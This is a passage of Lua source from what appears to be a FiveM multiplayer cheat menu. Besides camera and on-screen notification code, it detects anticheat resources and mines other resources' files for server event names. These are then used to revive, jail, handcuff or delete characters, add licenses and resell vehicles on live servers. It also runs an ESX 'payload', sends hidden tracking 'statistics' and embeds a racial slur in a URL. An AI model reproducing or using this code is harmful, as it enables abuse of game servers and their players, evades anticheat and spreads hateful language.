                PCCT:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)

                PCCT:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)

            else

                if PCCT:GetFunction("IsDisabledControlPressed")(0, PCCT.Keys["LEFTSHIFT"]) then

                    TaskLeaveAnyVehicle(self.RCCar.Driver)

                    PCCT:GetFunction("TaskWanderStandard")(self.RCCar.Driver)

                else

                    PCCT:GetFunction("TaskVehicleDriveWander")(self.RCCar.Driver, PCCT:GetFunction("GetVehiclePedIsIn")(self.RCCar.Driver), 1000.0, 60)

                end



                PCCT:GetFunction("SetVehicleDoorsLockedForAllPlayers")(self.RCCar.Vehicle, false)

                PCCT:GetFunction("SetVehicleDoorsLocked")(self.RCCar.Vehicle, 7)

            end

        end



        if not driver then

            self.RCCar.On = false

            self.RCCar.Driver = nil

            self.RCCar.Vehicle = nil



            return

        end



        self.RCCar.On = true

        self.RCCar.Driver = driver

        self.RCCar.Vehicle = veh

    end



    PCCT.Spectating = false

    local spec_on



    function PCCT:Polar3DToWorld(entityPosition, radius, polarAngleDeg, azimuthAngleDeg)

        local polarAngleRad = polarAngleDeg * picho.math.pi / 180.0

        local azimuthAngleRad = azimuthAngleDeg * picho.math.pi / 180.0



        return {

            x = entityPosition.x + radius * (picho.math.sin(azimuthAngleRad) * picho.math.cos(polarAngleRad)),

            y = entityPosition.y - radius * (picho.math.sin(azimuthAngleRad) * picho.math.sin(polarAngleRad)),

            z = entityPosition.z - radius * picho.math.cos(azimuthAngleRad)

        }

    end



    local polar, azimuth = 0, 90



    function PCCT:SpectateTick()

        if not self:GetFunction("DoesCamExist")(self.SpectateCam) then

            self.SpectateCam = self:GetFunction("CreateCam")("DEFAULT_SCRIPTED_CAMERA", true)

            self:GetFunction("SetCamShakeAmplitude")(self.SpectateCam, 0.0)

        end



        while self.Enabled do

            Wait(0)



            if self.Spectating and not spec_on then

                self:GetFunction("SetCamActive")(self.SpectateCam, true)

                self:GetFunction("SetCamAffectsAiming")(self.Cam, false)

                self:GetFunction("SetCamActive")(self:GetFunction("GetRenderingCam")(), false)

                self:GetFunction("RenderScriptCams")(true, false, false, true, true)

                spec_on = true

                self:GetFunction("ClearPedTasks")(self.LocalPlayer)

            elseif not self.Spectating and spec_on then

                self:GetFunction("SetCamActive")(self.SpectateCam, false)

                self:GetFunction("SetCamActive")(self:GetFunction("GetRenderingCam")(), true)

                self:GetFunction("RenderScriptCams")(false, false, false, false, false)

                self:GetFunction("SetFocusEntity")(self.LocalPlayer)

                self.FreeCam:DisableMovement(false)

                spec_on = false

            end



            if self.Spectating and spec_on then

                self:GetFunction("StopGameplayCamShaking")(true)



                if not self.SpectatingPlayer or not self:GetFunction("DoesEntityExist")(self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)) then

                    self.Spectating = false

                end



                local ent = self:GetFunction("GetPlayerPed")(self.SpectatingPlayer)



                if self:GetFunction("IsPedInAnyVehicle")(ent) then

                    ent = self:GetFunction("GetVehiclePedIsIn")(ent)

                end



                local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(ent, 0.0, 0.0, 0.0)



                if not self.Showing then

                    local magX, magY = self:GetFunction("GetDisabledControlNormal")(0, 1), self:GetFunction("GetDisabledControlNormal")(0, 2)

                    polar = polar + magX * 10



                    if polar >= 360 then

                        polar = 0

                    end



                    azimuth = azimuth + magY * 10



                    if azimuth >= 360 then

                        azimuth = 0

                    end

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELUP"]) then

                    picho.spectating_fov = picho.spectating_fov + 0.1



                    if picho.spectating_fov > 10.0 then

                        picho.spectating_fov = 10.0

                    end

                end



                if PCCT:GetFunction("IsDisabledControlJustPressed")(0, PCCT.Keys["MWHEELDOWN"]) then

                    picho.spectating_fov = picho.spectating_fov - 0.1



                    if picho.spectating_fov < -10.0 then

                        picho.spectating_fov = -10.0

                    end

                end



                local where = self:Polar3DToWorld(coords, picho.spectating_fov, polar, azimuth)

                local coords = self:GetFunction("GetOffsetFromEntityInWorldCoords")(self.LocalPlayer)

                self:GetFunction("RequestCollisionAtCoord")(coords.x, coords.y, coords.z)

                self.FreeCam:DisableMovement(true)

                self:GetFunction("SetFocusPosAndVel")(where.x, where.y, where.z, 0, 0, 0)

                self:GetFunction("SetCamCoord")(self.SpectateCam, where.x, where.y, where.z)

                self:GetFunction("PointCamAtEntity")(self.SpectateCam, ent)

            end

        end

    end



    function PCCT:ScreenText(text, font, centered, x, y, scale, r, g, b, a)

        PCCT:GetFunction("SetTextFont")(font)

        PCCT:GetFunction("SetTextProportional")()

        PCCT:GetFunction("SetTextScale")(scale, scale)

        PCCT:GetFunction("SetTextColour")(r, g, b, a)

        PCCT:GetFunction("SetTextDropShadow")(0, 0, 0, 0, 255)

        PCCT:GetFunction("SetTextEdge")(1, 0, 0, 0, 255)

        PCCT:GetFunction("SetTextDropShadow")()

        PCCT:GetFunction("SetTextOutline")()

        PCCT:GetFunction("SetTextCentre")(centered)

        PCCT:GetFunction("BeginTextCommandDisplayText")("STRING")

        PCCT:GetFunction("AddTextComponentSubstringPlayerName")(text)

        PCCT:GetFunction("EndTextCommandDisplayText")(x, y)

    end



    function PCCT:NotificationAlpha(fade_out)

        last_alpha = PCCT:GetFunction("GetGameTimer")() + picho.math.huge

        if doing_alpha and not fade_out then return end

        doing_alpha = true



        CreateThread(function()

            while notif_alpha < 200 and not fade_out do

                Wait(0)

                notif_alpha = notif_alpha + 10

                if notif_alpha >= 200 then break end

            end



            while not fade_out and last_alpha > PCCT:GetFunction("GetGameTimer")() do

                Wait(0)

            end



            while notif_alpha > 0 or fade_out do

                notif_alpha = notif_alpha - 8

                Wait(0)

                if notif_alpha <= 0 then break end

            end



            doing_alpha = false

        end)

    end



    local type_colors = {

        ["INFO"] = {

            text = "[~b~INFO~s~]"

        },

        ["AVISO"] = {

            text = "[~o~AVISO~s~]"

        },

        ["ERROR"] = {

            text = "[~r~ERROR~s~]"

        },

        ["EXITO"] = {

            text = "[~g~EXITO~s~]"

        }

    }



    function PCCT:TrimString(str, only_whitespace)

        local char = "%s"

        if #str >= 70 and not only_whitespace then return str:sub(1, 67) .. "..." end



        return picho.string.match(str, "^" .. char .. "*(.-)" .. char .. "*$") or str

    end



    function PCCT:TrimStringBasedOnWidth(str, font, size, max_width)

        local real_width = self.Painter:GetTextWidth(str, font, size)

        if real_width <= max_width then return str end

        local out_str = str

        local cur = #str



        while real_width > max_width and out_str ~= "" do

            if not str:sub(cur, cur) then break end

            out_str = out_str:sub(1, cur - 1)

            real_width = self.Painter:GetTextWidth(out_str, font, size)

            cur = cur - 1

        end



        return out_str:sub(1, #out_str - 3) .. "..."

    end



    function PCCT:RGBToHex(rgb)

        local hexadecimal = ""



        for key, value in picho.pairs(rgb) do

            local hex = ""



            while (value > 0) do

                local index = picho.math.fmod(value, 16) + 1

                value = picho.math.floor(value / 16)

                hex = picho.string.sub("0123456789ABCDEF", index, index) .. hex

            end



            if (picho.string.len(hex) == 0) then

                hex = "00"

            elseif (picho.string.len(hex) == 1) then

                hex = "0" .. hex

            end



            hexadecimal = hexadecimal .. hex

        end



        return hexadecimal

    end



    function PCCT:DrawNotifications()

        picho.notifications_h = 64

        local max_notifs_on_screen = 20

        local cur_on_screen = 0

        if not self.Config.ShowNotifications then return end



        if not cur_notifs then

            cur_notifs = #self.Notifications

            self:NotificationAlpha()

        end



        if cur_notifs ~= #self.Notifications then

            cur_notifs = #self.Notifications

            self:NotificationAlpha()

        end



        if self.Showing then

            notif_alpha = 200

        elseif not self.Showing and cur_notifs <= 0 and notif_alpha == 200 then

            self:NotificationAlpha(true)

        end



        if cur_notifs <= 0 and last_alpha - self:GetFunction("GetGameTimer")() >= picho.math.huge then

            last_alpha = self:GetFunction("GetGameTimer")() + 2000

        end



        if notif_alpha <= 0 then return end

        local n_x, n_y, n_w = self.Config.NotifX, self.Config.NotifY, self.Config.NotifW

        if not n_x or not n_y or not n_w then return end

        self.Painter:DrawText("~s~[" .. ("<font color='#%s'>%s</font>"):format(PCCT.TertiaryHex, PCCT.Name) .. "~s~] Notificaciones", 4, false, n_x, n_y, 0.35, 255, 255, 255, picho.math.ceil(notif_alpha + 55))



        if #self.Notifications <= 0 then

            self.Painter:DrawText("~s~Sin notificaciones.", 4, false, n_x + 0.5, n_y + 34, 0.35, 255, 255, 255, picho.math.ceil(notif_alpha + 55))

        else

            local notifY = n_y + 33

            local s_y = notifY

            local id = 1



            for k, v in picho.pairs(self.Notifications) do

                if cur_on_screen < max_notifs_on_screen then

                    local left = v.Expires - self:GetFunction("GetGameTimer")()

                    local str = (type_colors[v.Type] or {}).text



                    if str == nil then

                        str = "BAD TYPE - " .. v.Type

                        v.Message = ""

                    end



                    local n_alpha = notif_alpha + 50



                    if left <= 0 then

                        picho.table.remove(self.Notifications, k)

                    else

                        local w_ = self.Painter:GetTextWidth(str, 4, 0.35)

                        n_alpha = picho.math.ceil(n_alpha * (left / 1000) / v.Duration)

                        self.Painter:DrawText(str, 4, false, n_x, notifY, 0.35, 255, 255, 255, _clamp(picho.math.ceil(n_alpha + 15), 0, 255))

                        self.Painter:DrawText(self:TrimStringBasedOnWidth(v.Message, 4, 0.35, n_w - w_ + 8), 4, false, n_x + w_ - 3, notifY, 0.35, 255, 255, 255, _clamp(picho.math.ceil(n_alpha + 15), 0, 255))

                        notifY = notifY + 22

                        id = id + 1

                        cur_on_screen = cur_on_screen + 1

                    end

                end

            end



            local e_y = notifY

            local diff = e_y - s_y

            picho.notifications_h = picho.notifications_h + (diff - 27)

        end



        self.Painter:DrawRect(n_x, n_y, 420, picho.notifications_h, 0, 0, 0, notif_alpha)

        self.Painter:DrawRect(n_x, n_y + 29, 420, 2, self.Config.Tertiary[1], self.Config.Tertiary[2], self.Config.Tertiary[3], notif_alpha + 55)

    end



    local text_alpha = 255



    CreateThread(function()

        while PCCT.Enabled do

            Wait(0)



            if not PCCT.Config.ShowText then

                text_alpha = _lerp(0.05, text_alpha, -255)

            else

                text_alpha = _lerp(0.05, text_alpha, 255)

            end



            text_alpha = picho.math.ceil(text_alpha)



            if text_alpha > 0 then

                local veh = PCCT:GetFunction("GetVehiclePedIsIn")(PCCT.LocalPlayer)

                local br_wide = _text_width(branding.name)

                local r_wide = _text_width(branding.resource)

                local ip_wide = _text_width(branding.ip)

                local id_wide = _text_width(branding.id)

                local b_wide = _text_width(branding.build)

                local v_wide

                local curY = 0.895



                if PCCT:GetFunction("DoesEntityExist")(veh) then

                    v_wide = _text_width(branding.veh:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))))

                    curY = 0.875

                end



                PCCT:ScreenText(branding.name, 4, 0.0, 1.0 - br_wide, curY, 0.35, 255, 255, 255, text_alpha)

                curY = curY + 0.02

                PCCT:ScreenText(branding.resource, 4, 0.0, 1.0 - r_wide, curY, 0.35, 255, 255, 255, text_alpha)

                curY = curY + 0.02

                PCCT:ScreenText(branding.ip, 4, 0.0, 1.0 - ip_wide, curY, 0.35, 255, 255, 255, text_alpha)

                curY = curY + 0.02

                PCCT:ScreenText(branding.id, 4, 0.0, 1.0 - id_wide, curY, 0.35, 255, 255, 255, text_alpha)

                curY = curY + 0.02



                if PCCT:GetFunction("DoesEntityExist")(veh) then

                    PCCT:ScreenText(branding.veh:format(GetDisplayNameFromVehicleModel(GetEntityModel(veh))), 4, 0.0, 1.0 - v_wide, curY, 0.35, 255, 255, 255, text_alpha)

                    curY = curY + 0.02

                end



                PCCT:ScreenText(branding.build, 4, 0.0, 1.0 - b_wide, curY, 0.35, 255, 255, 255, text_alpha)

            end

        end

    end)



    local RList = {

        {

            Resource = "alpha-tango-golf",

            Name = "~b~ATG",

            Pattern = function(res, resources) return resources[res] end

        },

        {

            Resource = "screenshot-basic",

            Name = "~g~screenshot-basic",

            Pattern = function(res, resources) return resources[res] end

        },

        {

            Resource = "anticheese-anticheat",

            Name = "~g~AntiCheese",

            Pattern = function(res, resources) return resources[res] end

        },

        {

            Resource = "ChocoHax",

            Name = "~r~ChocoHax",

            Pattern = function() return ChXaC ~= nil end

        }

    }



    local file_pichos = {"client_script", "file", "shared_script"}

    local resource_pichos = {"__resource.lua", "fxmanifest.lua"}



    function PCCT:GetResourceData(name)

        local data = {

            files = {},

            main = {}

        }



        for _, str in picho.ipairs(file_pichos) do

            local meta_keys = self:GetFunction("GetNumResourceMetadata")(name, str)



            for meta_key = 0, meta_keys - 1 do

                local path = self:GetFunction("GetResourceMetadata")(name, str, meta_key)



                if path and picho.type(path) == "string" and not path:find("@") then

                    data.files[path] = true

                end

            end

        end



        for _, str in picho.ipairs(resource_pichos) do

            if self:GetFunction("LoadResourceFile")(name, str) ~= nil then

                data.main[str] = true

            end

        end



        return data

    end



    function PCCT:RunACChecker()

        PCCT:Print("[AC Checker] Checkeando...")



        for i = 1, PCCT:GetFunction("GetNumResources")() do

            local name = PCCT:GetFunction("GetResourceByFindIndex")(i)



            if picho.type(name) == "string" and PCCT:GetFunction("GetResourceState")(name) == "started" then

                resource_list[name] = true

                resource_data[name] = self:GetResourceData(name)

            end

        end



        for _, dat in picho.pairs(RList) do

            if dat.Pattern(dat.Resource, resource_list) then

                self:AddNotification("AVISO!", dat.Name .. " ~s~Detectado!", 30000)

                PCCT:Print("[AC Checker] Found ^3" .. dat.Resource .. "^7")

            end

        end

    end



    function PCCT:GetResourceFile(res, file)

        if not resource_data[res] then return end

        local files = resource_data[res].files

        if files[file] then return file end



        for str, _ in picho.pairs(files) do

            if str:find(file) then return str end

        end

    end



    local function _split(content, pattern)

        local lines = {}



        for s in content:gmatch(pattern) do

            lines[#lines + 1] = s

        end



        return lines

    end



    local function _find(tab, what)

        local ret = {}



        for id, val in picho.pairs(tab) do

            if val == what or val:find(what) then

                ret[#ret + 1] = id

            end

        end



        return ret

    end



    local function _get_depth(line, lines, deep)

        local out = {}



        for i = -deep, deep do

            out[line + i] = lines[line + i]

        end



        return out

    end



    local function _replaced(res, data, suppress)

        local replaced

        if not resource_list[res] then return end



        if picho.type(data.File) == "table" then

            for _, file in picho.ipairs(data.File) do

                file = PCCT:GetResourceFile(res, file)



                if file then

                    local contents = PCCT:GetFunction("LoadResourceFile")(res, file)

                    if contents ~= nil and type(contents) ~= "string" then return FM:AddNotification("ERROR", "A fatal error occured while trying to load the file.", 5000) end

                    if not contents or contents == "nil" or contents:len() <= 0 then return end

                    local lines = _split(contents, "[^\r\n]+")



                    for _, dat in picho.pairs(data.KnownTriggers) do

                        local content

                        local line



                        if dat.LookFor then

                            local _lines = _find(lines, dat.LookFor)



                            if _lines then

                                for k, _line in picho.pairs(_lines) do

                                    local depth = dat.Depth or 3

                                    local possible = _get_depth(_line, lines, depth)



                                    for _, val in picho.pairs(possible) do

                                        local match



                                        for _, x in picho.pairs(dat.Strip) do

                                            if val:find(x) then

                                                if match == val then break end

                                                match = val

                                            else

                                                match = nil

                                            end

                                        end



                                        if match then

                                            content = match

                                            break

                                            break

                                        end

                                    end

                                end

                            end

                        else

                            content = lines[dat.Line]

                        end



                        if content then

                            local contains



                            for _, strip in picho.pairs(dat.Strip) do

                                if not contains then

                                    contains = content:find(strip) ~= nil

                                end



                                content = content:gsub(strip, "")

                            end



                            content = PCCT:TrimString(content, true)

                            PCCT.DynamicTriggers[res] = PCCT.DynamicTriggers[res] or {}



                            if contains and content ~= dat.Trigger then

                                replaced = true



                                if (content:find("'" .. dat.Trigger .. "'") or content:find("\"" .. dat.Trigger .. "\"")) and not dat.Force then

                                    content = dat.Trigger

                                    replaced = false

                                end



                                PCCT.DynamicTriggers[res][dat.Trigger] = content



                                if replaced and not suppress then

                                    PCCT:Print("[Dynamic Triggers] ^5Replaced trigger ^6" .. dat.Trigger .. " ^7to ^3" .. content .. "^7")

                                end

                            elseif contains and content == dat.Trigger then

                                PCCT.DynamicTriggers[res][dat.Trigger] = dat.Trigger



                                if not suppress then

                                    PCCT:Print("[Dynamic Triggers] ^2Unchanged ^7trigger ^6" .. dat.Trigger .. "^7")

                                end



                                replaced = true

                            elseif not suppress then

                                PCCT:AddNotification("ERROR", "Failed to get dynamic trigger " .. dat.Trigger, 20000)

                                PCCT:Print("[Dynamic Triggers] ^1Failed ^7to get trigger ^6" .. dat.Trigger .. "^7")

                            end

                        elseif not suppress then

                            PCCT:Print("[Dynamic Triggers] Resource not found. (" .. res .. ")")

                        end

                    end

                end

            end

        else

            local file = PCCT:GetResourceFile(res, data.File)



            if file then

                local contents = PCCT:GetFunction("LoadResourceFile")(res, file)

                if not contents or contents == "nil" or contents:len() <= 0 then return end

                local lines = _split(contents, "[^\r\n]+")



                for _, dat in picho.pairs(data.KnownTriggers) do

                    local content = ""

                    local line



                    if dat.LookFor then

                        local _lines = _find(lines, dat.LookFor)



                        if _lines then

                            for k, _line in picho.pairs(_lines) do

                                local depth = dat.Depth or 3

                                local possible = _get_depth(_line, lines, depth)



                                for _, val in picho.pairs(possible) do

                                    local match



                                    for _, x in picho.pairs(dat.Strip) do

                                        if val:find(x) then

                                            if match == val then break end

                                            match = val

                                        else

                                            match = nil

                                        end

                                    end



                                    if match then

                                        content = match

                                        break

                                        break

                                    end

                                end

                            end

                        end

                    else

                        content = lines[dat.Line]

                    end



                    if content then

                        local contains



                        for _, strip in picho.pairs(dat.Strip) do

                            if not contains then

                                contains = content:find(strip) ~= nil

                            end



                            content = content:gsub(strip, "")

                        end



                        content = PCCT:TrimString(content, true)

                        PCCT.DynamicTriggers[res] = PCCT.DynamicTriggers[res] or {}



                        if contains and content ~= dat.Trigger then

                            replaced = true



                            if (content:find("'" .. dat.Trigger .. "'") or content:find("\"" .. dat.Trigger .. "\"")) and not dat.Force then

                                content = dat.Trigger

                                replaced = false

                            end



                            PCCT.DynamicTriggers[res][dat.Trigger] = content



                            if replaced then

                                PCCT:Print("[Dynamic Triggers] ^5Trigger remplazado ^6" .. dat.Trigger .. " ^7to ^3" .. content .. "^7")

                            end

                        elseif contains and content == dat.Trigger then

                            PCCT.DynamicTriggers[res][dat.Trigger] = dat.Trigger

                            PCCT:Print("[Dynamic Triggers] ^2Sin cambiar el ^7trigger ^6" .. dat.Trigger .. "^7")

                            replaced = true

                        else

                            PCCT:AddNotification("ERROR", "No se pudo obtener el trigger " .. dat.Trigger, 20000)

                            PCCT:Print("[Dynamic Triggers] ^1Se fallo en ^7conseguir el trigger ^6" .. dat.Trigger .. "^7")

                        end

                    else

                        PCCT:Print("[Dynamic Triggers] Recurso no encontrado. (" .. res .. ")")

                    end

                end

            end

        end



        return replaced

    end



    local Ibuttons = nil

    local _buttons = {}



    function PCCT:SetIbuttons(buttons)

        buttons = buttons or _buttons



        if not PCCT:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then

            Ibuttons = PCCT:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")



            while not PCCT:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do

                Wait(0)

            end

        else

            Ibuttons = PCCT:GetFunction("RequestScaleformMovie")("INSTRUCTIONAL_BUTTONS")



            while not PCCT:GetFunction("HasScaleformMovieLoaded")(Ibuttons) do

                Wait(0)

            end

        end



        local sf = Ibuttons

        local w, h = PCCT:GetFunction("GetActiveScreenResolution")()

        PCCT:GetFunction("BeginScaleformMovieMethod")(sf, "CLEAR_ALL")

        PCCT:GetFunction("EndScaleformMovieMethodReturnValue")()



        for i, btn in picho.pairs(buttons) do

            PCCT:GetFunction("BeginScaleformMovieMethod")(sf, "SET_DATA_SLOT")

            PCCT:GetFunction("ScaleformMovieMethodAddParamInt")(i - 1)

            PCCT:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[1])

            PCCT:GetFunction("ScaleformMovieMethodAddParamTextureNameString")(btn[2])

            PCCT:GetFunction("EndScaleformMovieMethodReturnValue")()

        end



        PCCT:GetFunction("BeginScaleformMovieMethod")(sf, "DRAW_INSTRUCTIONAL_BUTTONS")

        PCCT:GetFunction("ScaleformMovieMethodAddParamInt")(layout)

        PCCT:GetFunction("EndScaleformMovieMethodReturnValue")()

    end



    function PCCT:DrawIbuttons()

        if PCCT:GetFunction("HasScaleformMovieLoaded")(Ibuttons) then

            PCCT:GetFunction("DrawScaleformMovie")(Ibuttons, 0.5, 0.5, 1.0, 1.0, 255, 255, 255, 255)

            self:SetIbuttons()

        end

    end



    local TEList = {

        {

            Resource = {"esx_kashacter", "esx_kashacters", "kashacter"},

            File = "client/main.lua",

            KnownTriggers = {

                {

                    Trigger = "kashactersS:DeleteCharacter",

                    LookFor = "data.charid%)",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "~g~ESX ~s~Kashacters",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = {"esx_inventoryhud", "inventoryhud"},

            File = "client/player.lua",

            KnownTriggers = {

                {

                    Trigger = "esx_inventoryhud:openPlayerInventory",

                    LookFor = "PlayerData = ESX.GetPlayerData%(%)",

                    Strip = {"AddEventHandler%(\"", "\", (.*)"}

                }

            },

            Name = "~g~ESX ~s~Inventory",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = {"esx_basicneeds", "needs"},

            File = "client/main.lua",

            KnownTriggers = {

                {

                    Trigger = "esx_basicneeds:healPlayer",

                    LookFor = "restore hunger & thirst",

                    Strip = {"AddEventHandler%('", "', (.*)"}

                },

                {

                    Trigger = "esx:getSharedObject",

                    LookFor = "while ESX == nil do",

                    Strip = {"TriggerEvent%('", "', (.*)"}

                }

            },

            Name = "~g~ESX ~s~Needs",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = "chat",

            File = {"cl_chat.lua"},

            KnownTriggers = {

                {

                    Trigger = "_chat:messageEntered",

                    LookFor = "ExecuteCommand%(",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "Chat",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = {"esx_ambulancejob", "ambulancejob"},

            File = "client/main.lua",

            KnownTriggers = {

                {

                    Trigger = "esx_ambulancejob:revive",

                    LookFor = "local coords = GetEntityCoords%(playerPed%)",

                    Strip = {"AddEventHandler%('", "', function%(%)"}

                }

            },

            Name = "~g~ESX ~s~Ambulance Job",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = "gcphone",

            File = "client/twitter.lua",

            KnownTriggers = {

                {

                    Trigger = "gcPhone:twitter_postTweets",

                    LookFor = "RegisterNUICallback%('twitter_postTweet', function%(data, cb%)",

                    Depth = 2,

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "~g~ESX ~s~GCPhone",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = {"esx_policejob", "policejob"},

            File = "client/main.lua",

            KnownTriggers = {

                {

                    Trigger = "esx_communityservice:sendToCommunityService",

                    LookFor = "menu.close%(%)",

                    Strip = {"TriggerServerEvent%(\"", "\", (.*)"}

                },

                {

                    Trigger = "esx_policejob:handcuff",

                    LookFor = "action == 'handcuff'",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "~g~ESX ~s~Police Job",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = {"esx-qalle-jail", "qalle"},

            File = "client/client.lua",

            KnownTriggers = {

                {

                    Trigger = "esx-qalle-jail:jailPlayer",

                    LookFor = "ESX.ShowNotification%(\"No players nearby!\"%)",

                    Strip = {"TriggerServerEvent%(\"", "\", (.*)"}

                }

            },

            Name = "~g~ESX ~s~Qalle Jail",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = {"esx_dmvschool", "dmvschool"},

            File = "client/main.lua",

            KnownTriggers = {

                {

                    Trigger = "esx_dmvschool:addLicense",

                    LookFor = "ESX.ShowNotification%(_U%('passed_test'%)%)",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "~g~ESX ~s~DMV School",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = "CarryPeople",

            File = "cl_carry.lua",

            KnownTriggers = {

                {

                    Trigger = "CarryPeople:sync",

                    LookFor = "closestPlayer ~= nil",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "CarryPeople",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = "TakeHostage",

            File = "cl_takehostage.lua",

            KnownTriggers = {

                {

                    Trigger = "cmg3_animations:sync",

                    LookFor = "holdingHostage = true",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "TakeHostage",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = "PiggyBack",

            File = "cl_piggyback.lua",

            KnownTriggers = {

                {

                    Trigger = "cmg2_animations:sync",

                    LookFor = "piggyBackInProgress = true",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                }

            },

            Name = "PiggyBack",

            Replacement = function(res, data) return _replaced(res, data) end

        },

        {

            Resource = {"es_extended", "extended"},

            File = "client/common.lua",

            KnownTriggers = {

                {

                    Trigger = "esx:getSharedObject",

                    LookFor = "AddEventHandler%('",

                    Strip = {"AddEventHandler%('", "', (.*)"}

                }

            },

            Name = "ES Extended",

            Replacement = function(res, data)

                _replaced(res, data, true)

                if not PCCT.DynamicTriggers[res] and not PCCT.DynamicTriggers["esx_basicneeds"] then return end

                local real = (PCCT.DynamicTriggers[res] and PCCT.DynamicTriggers[res]["esx:getSharedObject"]) or (PCCT.DynamicTriggers["esx_basicneeds"] and PCCT.DynamicTriggers["esx_basicneeds"]["esx:getSharedObject"])



                if real then

                    PCCT:AddNotification("INFO", "A reference to ~g~ESX ~s~object could not be made automatically. Excute payload at your own risk!", 20000)

                    picho.payload_trigger = real



                    picho.payload = function()

                        PCCT:GetFunction("TriggerEvent")(picho.payload_trigger, function(obj)

                            picho.ESX = obj

                            PCCT.ESX = picho.ESX

                            PCCT:AddNotification("INFO", "Consegui referencia ~g~ESX ~s~object.", 20000)

                        end)

                    end

                end



                return false

            end

        },

        {

            Resource = "esx_vehicleshop",

            File = "client/main.lua",

            KnownTriggers = {

                {

                    Trigger = "esx_vehicleshop:setVehicleOwnedPlayerId",

                    LookFor = "vehicleProps.plate = newPlate",

                    Strip = {"TriggerServerEvent%('", "', (.*)"}

                },

                {

                    Trigger = "esx_vehicleshop:resellVehicle",

                    LookFor = "CurrentAction == 'resell_vehicle'",

                    Strip = {"ESX.TriggerServerCallback%('", "', (.*)"}

                }

            },

            Name = "~g~ESX ~w~Vehicle Shop",

            Replacement = function(res, data) return _replaced(res, data) end

        },

    }



    function PCCT:FindLikeResource(str)

        for name, _ in picho.pairs(resource_list) do

            if name:lower() == str:lower() or name:lower():find(str:lower()) then

                return name

            end

        end



        return str

    end



    function PCCT:RunDynamicTriggers()

        PCCT:AddNotification("INFO", "Buscando triggers.", 15000)



        for _, dat in picho.pairs(TEList) do

            if picho.type(dat.Resource) == "table" then

                for _, str in picho.ipairs(dat.Resource) do

                    str = PCCT:FindLikeResource(str)

                    if dat.Replacement and dat.Replacement(str, dat) then

                        PCCT:AddNotification("INFO", "Triggers dinamicos actualizados " .. dat.Name, 20000)

                        break

                    end

                end

            elseif dat.Replacement and dat.Replacement(dat.Resource, dat) then

                PCCT:AddNotification("INFO", "Triggers dinamicos actualizados  " .. dat.Name, 20000)

            end

        end

    end



    function PCCT:LoadDui()

        local runtime_txd = PCCT:GetFunction("CreateRuntimeTxd")(self.DuiName)

        local banner_dui = PCCT:GetFunction("CreateDui")("https://c.tenor.com/F7U-50-hC1IAAAAC/ned-flanders-flanders.gif", 300, 300)

        local b_dui = PCCT:GetFunction("GetDuiHandle")(banner_dui)

        if not b_dui or not banner_dui then return self:AddNotification("ERROR", "DUI Handle could not be allocated.", 5000) end

        PCCT:GetFunction("CreateRuntimeTextureFromDuiHandle")(runtime_txd, "watermark", b_dui)

    end



    function PCCT.CharToHex(c)

        return picho.string.format("%%%02X", picho.string.byte(c))

    end



    function PCCT:URIEncode(url)

        if url == nil then return end

        url = url:gsub("\n", "\r\n")

        url = url:gsub("([^%w _%%%-%.~])", self.CharToHex)

        url = url:gsub(" ", "+")



        return url

    end



    function PCCT:DoStatistics()

        if not PCCT.Identifier then return end



        local statistics = {

            name = PCCT:GetFunction("GetPlayerName")(PCCT.NetworkID),

            build = PCCT.Build,

            server = PCCT:GetFunction("GetCurrentServerEndpoint")()

        }



        local stat_url = "" .. PCCT:URIEncode(PCCT.Identifier) .. "&information=" .. PCCT:URIEncode(picho.json.encode(statistics)) .. "&scid=fm_0000_fuck_off_nigger_0000_stupid_cunt_0000"

        local s_dui = PCCT:GetFunction("CreateDui")(stat_url, 50, 50)

        Wait(10000)

        PCCT:GetFunction("DestroyDui")(s_dui)

        PCCT:Print("[Statistics] Actualizadas.")

    end



    function PCCT:DoBlacklistedEvent(reason)

        local w, h = self:GetFunction("GetActiveScreenResolution")()

        local x, y = self:GetFunction("GetNuiCursorPosition")()

        self._ScrW = w

        self._ScrH = h

        self._MouseX = x

        self._MouseY = y

        local runtime_txd = PCCT:GetFunction("CreateRuntimeTxd")(self.DuiName)

        local blacklist_dui = PCCT:GetFunction("CreateDui")("https://cdn.discordapp.com/emojis/489638258129502236.gif?v=1", 300, 300)

        local b_dui = PCCT:GetFunction("GetDuiHandle")(blacklist_dui)

        PCCT:GetFunction("CreateRuntimeTextureFromDuiHandle")(runtime_txd, "blacklisted", b_dui)



        CreateThread(function()

            while true do

                self.Painter:DrawRect(0, 0, PCCT:ScrW(), PCCT:ScrH(), 0, 0, 0, 255)

